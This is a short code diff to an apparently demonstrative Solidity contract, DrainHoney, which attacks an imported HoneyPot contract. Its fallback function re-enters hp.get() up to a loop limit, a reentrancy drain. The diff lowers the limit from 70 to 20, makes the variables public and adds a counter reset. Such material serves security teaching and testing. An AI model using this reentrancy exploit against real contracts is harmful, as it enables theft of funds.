@@ -8,8 +8,8 @@ import './HoneyPot.sol';
 contract DrainHoney {
 
   HoneyPot hp;
-  uint loop;
-  address hacker;
+  uint public loop;
+  address public hacker;
 
   function DrainHoney(address _contract) {
     hp = HoneyPot(_contract);
@@ -31,9 +31,10 @@ contract DrainHoney {
   }
 
   function() payable {
-     if (loop < 70) {
-       loop++;
-       hp.get();
-     }
+    if (loop < 20) {
+      loop++;
+      hp.get();
+    }
+    loop = 0;
   }
 }
